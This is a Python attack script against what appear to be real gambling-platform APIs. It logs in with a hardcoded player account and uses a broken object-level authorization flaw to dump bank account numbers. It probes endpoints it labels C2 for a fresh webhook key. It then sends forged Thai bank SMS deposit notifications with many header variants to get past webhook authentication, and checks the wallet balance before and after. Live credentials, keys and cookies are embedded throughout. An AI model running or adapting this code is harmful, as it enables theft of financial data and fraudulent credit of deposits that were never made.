#!/usr/bin/env python3
"""probe_bank_webhook.py — Get mule bank_no + fresh PAPDIEAW-KEY attempts.

   BOLA confirmed: /bo/info/bank-information returns bank data with player JWT.
   Webhook: static key expired. Need fresh key OR alternative auth.

   1. Full BOLA bank-information dump → find mule account numbers
   2. Try alternative webhook header names
   3. Try all C2 endpoints for fresh key
   4. Try webhook with Authorization: Bearer player JWT
   5. Download GCS APK index → check for newer key extraction
"""
import base64, json, pathlib, requests, time

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

PAPDIEAW_KEY = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
FRESH_TX_REF = "016282212408DTF71867"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. Full BOLA bank-information ─────────────────────────────────────────────
print("=== 1. Full BOLA /bo/info/bank-information ===")
r = requests.get(f"{BGAPI}/bo/info/bank-information",
                 headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                 params={"domain": DOMAIN, "skip": 0, "limit": 50},
                 timeout=15)
print(f"  HTTP {r.status_code}")
if r.ok:
    try:
        data = r.json()
        items = data if isinstance(data, list) else data.get("data", [data])
        print(f"  {len(items)} items")
        for item in items:
            # Extract bank_no and account details
            bi = item.get("bank_information", item)
            pid = item.get("id", bi.get("id", "?"))[:8]
            bank_code = bi.get("bank_code", item.get("bank_code", "?"))
            bank_no = item.get("bank_no") or bi.get("bank_no") or item.get("account_no", "")
            status = item.get("is_active") or item.get("status", "?")
            print(f"    {pid} | {bank_code:10} | bank_no={bank_no or '<none>'} | active={status}")
            # Check for nested payment_account
            for key in ["payment_account", "account", "account_number", "bank_account"]:
                val = item.get(key) or bi.get(key)
                if val:
                    print(f"      {key}={val}")
    except Exception as e:
        print(f"  parse error: {e}")
        print(f"  raw (first 500): {r.text[:500]}")

# Also try payment-bank-information (different endpoint)
print("\n=== 1b. /bo/info/payment-bank-information ===")
r2 = requests.get(f"{BGAPI}/bo/info/payment-bank-information",
                  headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                  params={"domain": DOMAIN, "skip": 0, "limit": 20},
                  timeout=15)
print(f"  HTTP {r2.status_code}: {r2.text[:600]}")

# ── 2. Try C2 endpoints for fresh PAPDIEAW-KEY ───────────────────────────────
print("\n=== 2. C2 fresh key probe ===")
c2_bases = [
    "https://bot-auto.jokerslotz999.com",
    "https://staging-bot.luxino.com",
    "https://bot-auto.ztechdev.com",
]
c2_paths = [
    "/service/deposit/get-endpoint-webhook",
    "/service/authenticate",
    "/health",
    "/",
]
for base in c2_bases:
    for path in c2_paths[:2]:
        try:
            r = requests.get(f"{base}{path}", timeout=5,
                             headers={"PAPDIEAW-KEY": PAPDIEAW_KEY,
                                      "User-Agent": "okhttp/3.12.1"})
            print(f"  {base}{path}: HTTP {r.status_code}: {r.text[:150]}")
            if r.ok and "key" in r.text.lower():
                print(f"  [!!!] Possible fresh key in response!")
        except Exception as e:
            print(f"  {base}{path}: TIMEOUT/ERR ({type(e).__name__})")
        time.sleep(0.5)

# ── 3. Alternative webhook auth headers ──────────────────────────────────────
print("\n=== 3. Alternative webhook auth headers ===")
test_payload = {
    "address": "K-Bank",
    "message": f"K PLUS\nรับเงินผ่าน PromptPay\n500.00 บาท\nRef. {FRESH_TX_REF}",
    "timestamp": int(time.time() * 1000),
    "bank_no": "0543753327",
    "sms_id": "sms-test-001",
    "type": "sms_deposit",
}

alt_headers = [
    # Key name variants
    {"PAPDIEAW-KEY": PAPDIEAW_KEY},
    {"X-PAPDIEAW-KEY": PAPDIEAW_KEY},
    {"x-papdieaw-key": PAPDIEAW_KEY},
    {"Authorization": f"Bearer {JWT}"},  # use player JWT as auth
    {"Authorization": f"Bearer {PAPDIEAW_KEY}"},  # raw key as bearer
    {"X-API-Key": PAPDIEAW_KEY},
    {"X-Webhook-Key": PAPDIEAW_KEY},
    {"PAPDIEAW-KEY": PAPDIEAW_KEY, "Authorization": f"Bearer {JWT}"},  # dual auth
    # No auth at all
    {},
]
for ah in alt_headers:
    hdr = {**ah, "Content-Type": "application/json", "User-Agent": "okhttp/3.12.1"}
    r = requests.post(f"{MGAPI}/webhook-sms", headers=hdr, json=test_payload, timeout=10)
    auth_label = list(ah.keys())[0] if ah else "no-auth"
    print(f"  [{auth_label[:20]:20}] → HTTP {r.status_code}: {r.text[:80]}")
    time.sleep(0.3)

# ── 4. Check pbapi for queued deposit IDs ────────────────────────────────────
print("\n=== 4. Find queued deposit TX IDs via pbapi ===")
# Try finding our fresh deposit by tx_ref
for q in [
    f"this.tx_ref=='{FRESH_TX_REF}'",
    f"this.qr_ref=='{FRESH_TX_REF}'",
    "this.status=='pending'",
    "this.status=='waiting'",
]:
    r = requests.get(f"{PBAPI}/pb/latest-win",
                     headers={"Authorization": f"Bearer {JWT}"},
                     params={"domain": DOMAIN, "$where": q, "$limit": 5},
                     timeout=10)
    if r.ok:
        try:
            data = r.json()
            items = data if isinstance(data, list) else data.get("data", [])
            if items and str(items) != "[]":
                print(f"  [{q[:30]}] → {str(items)[:300]}")
        except Exception:
            pass

# ── 5. GCS luxino-public APK listing ─────────────────────────────────────────
print("\n=== 5. GCS luxino-public bucket APK check ===")
gcs_url = "https://storage.googleapis.com/storage/v1/b/luxino-public/o?maxResults=20"
r = requests.get(gcs_url, timeout=15)
print(f"  HTTP {r.status_code}")
if r.ok:
    try:
        items = r.json().get("items", [])
        for item in items:
            name = item.get("name", "")
            size = item.get("size", "?")
            updated = item.get("updated", "")[:10]
            print(f"    {name:40} size={size:8} updated={updated}")
    except Exception:
        print(f"  {r.text[:300]}")

time.sleep(2)
print(f"\nFINAL wallet: {wallet()}")
